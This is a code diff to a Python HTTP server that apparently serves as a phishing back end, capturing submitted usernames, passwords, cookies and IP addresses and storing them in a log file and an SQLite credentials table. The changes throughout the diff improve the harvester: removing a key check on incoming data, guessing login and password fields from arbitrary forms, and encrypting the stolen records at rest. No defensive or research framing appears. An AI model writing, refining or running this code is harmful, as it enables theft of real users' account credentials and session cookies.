@@ -53,6 +53,8 @@ fernet_key_file = 'fernet_key.bin'
 if os.path.exists(fernet_key_file):
     with open(fernet_key_file, 'rb') as f:
         fernet_key = f.read()
+    # Set secure file permissions (readable/writable only by owner)
+    os.chmod(fernet_key_file, 0o600)
 else:
     logging.error("Fernet key file not found")
     raise Exception("Fernet key file not found")
@@ -189,52 +191,49 @@ class AsukaHandler(BaseHTTPRequestHandler):
                 csrf_token = None
                 raw_data = post_data
 
-                encrypted_data = params.get('data', [''])[0]
-                if encrypted_data:
+                encoded_data = params.get('data', [''])[0]
+                if encoded_data:
                     try:
-                        key, data = encrypted_data.split(':', 1)
-                        decoded_key = base64.b64decode(key)
-                        if decoded_key == fernet_key:
-                            decrypted = json.loads(base64.b64decode(data).decode('utf-8', errors='ignore'))
-                            logging.debug(f"Decrypted data: {decrypted}")
+                        # Decode base64-encoded data
+                        decoded_data = base64.b64decode(encoded_data).decode('utf-8', errors='ignore')
+                        decrypted = json.loads(decoded_data)
+                        logging.debug(f"Decoded data: {decrypted}")
+                        for field, value in decrypted.items():
+                            if not value:
+                                continue
+                            if field == 'password':
+                                password = value
+                            elif field == 'username':
+                                username = value
+                            elif field == 'csrf_token' or field.lower() in ('authenticity_token', 'csrfmiddlewaretoken', 'csrf_token', 'csrftoken'):
+                                csrf_token = value
+                        if not username or not password:
+                            username_candidates = []
+                            password_candidates = []
                             for field, value in decrypted.items():
                                 if not value:
                                     continue
-                                if field == 'password':
-                                    password = value
-                                elif field == 'username':
-                                    username = value
-                                elif field == 'csrf_token' or field.lower() in ('authenticity_token', 'csrfmiddlewaretoken', 'csrf_token', 'csrftoken'):
-                                    csrf_token = value
-                            if not username or not password:
-                                username_candidates = []
-                                password_candidates = []
-                                for field, value in decrypted.items():
-                                    if not value:
-                                        continue
-                                    field_lower = field.lower()
-                                    score = 0
-                                    if re.search(r'login|username|email|user|key|account|id', field_lower):
-                                        score += 0.8
-                                    if 'email' in field_lower or 'login' in field_lower:
-                                        score += 0.2
-                                    if score > 0:
-                                        username_candidates.append((field, value, score))
-                                    score = 0
-                                    if re.search(r'password|pass|pwd', field_lower):
-                                        score += 0.9
-                                    if score > 0:
-                                        password_candidates.append((field, value, score))
-                                if username_candidates:
-                                    username = max(username_candidates, key=lambda x: x[2])[1]
-                                    logging.debug(f"Selected username: {username} (score: {max(username_candidates, key=lambda x: x[2])[2]})")
-                                if password_candidates:
-                                    password = max(password_candidates, key=lambda x: x[2])[1]
-                                    logging.debug(f"Selected password: {password} (score: {max(password_candidates, key=lambda x: x[2])[2]})")
-                        else:
-                            logging.error(f"Key mismatch: {key}")
+                                field_lower = field.lower()
+                                score = 0
+                                if re.search(r'login|username|email|user|key|account|id', field_lower):
+                                    score += 0.8
+                                if 'email' in field_lower or 'login' in field_lower:
+                                    score += 0.2
+                                if score > 0:
+                                    username_candidates.append((field, value, score))
+                                score = 0
+                                if re.search(r'password|pass|pwd', field_lower):
+                                    score += 0.9
+                                if score > 0:
+                                    password_candidates.append((field, value, score))
+                            if username_candidates:
+                                username = max(username_candidates, key=lambda x: x[2])[1]
+                                logging.debug(f"Selected username: {username} (score: {max(username_candidates, key=lambda x: x[2])[2]})")
+                            if password_candidates:
+                                password = max(password_candidates, key=lambda x: x[2])[1]
+                                logging.debug(f"Selected password: {password} (score: {max(password_candidates, key=lambda x: x[2])[2]})")
                     except Exception as e:
-                        logging.error(f"Error decrypting data: {e}")
+                        logging.error(f"Error decoding data: {e}")
 
                 if not (username and password):
                     for field, values in params.items():
@@ -271,6 +270,10 @@ class AsukaHandler(BaseHTTPRequestHandler):
                     if current_time - recent_submissions[k] > 1:
                         del recent_submissions[k]
 
+                # Encrypt sensitive fields before storing
+                encrypted_username = cipher.encrypt(username.encode()).decode('utf-8') if username != "N/A" else "N/A"
+                encrypted_password = cipher.encrypt(password.encode()).decode('utf-8') if password != "N/A" else "N/A"
+
                 print("\033[32m----------One Credential Captured!!----------\033[0m")
                 print(f"\033[32m[+] Timestamp: {datetime.now().isoformat()}\033[0m")
                 print(f"\033[32m[+] Username: {username}\033[0m")
@@ -293,16 +296,16 @@ class AsukaHandler(BaseHTTPRequestHandler):
                 logging.info(credential_message)
 
                 with open('credentials.log', 'a', encoding='utf-8') as f:
-                    f.write(f"[{datetime.now().isoformat()}] Username: {username}, Password: {password}, User-Agent: {self.headers.get('User-Agent', 'N/A')}, Cookies: {cookies}, Raw: {raw_data}, RequestId: {request_id}\n")
+                    f.write(f"[{datetime.now().isoformat()}] Username: {encrypted_username}, Password: {encrypted_password}, User-Agent: {self.headers.get('User-Agent', 'N/A')}, Cookies: {cookies}, Raw: {raw_data}, RequestId: {request_id}\n")
 
                 try:
                     conn = sqlite3.connect('asuka_data.db', timeout=10)
                     c = conn.cursor()
                     c.execute('''INSERT INTO CREDENTIALS (timestamp, username, password, ip, user_agent, cookies, raw_data)
                                  VALUES (?, ?, ?, ?, ?, ?, ?)''',
-                              (datetime.now().isoformat(), username, password, ip, self.headers.get('User-Agent', 'N/A'), cookies, raw_data))
+                              (datetime.now().isoformat(), encrypted_username, encrypted_password, ip, self.headers.get('User-Agent', 'N/A'), cookies, raw_data))
                     conn.commit()
-                    logging.info(f"Credentials saved: {username}, {ip}, requestId={request_id}")
+                    logging.info(f"Credentials saved: {encrypted_username}, {ip}, requestId={request_id}")
                 except sqlite3.Error as e:
                     logging.error(f"Database error: {e}")
                 finally:
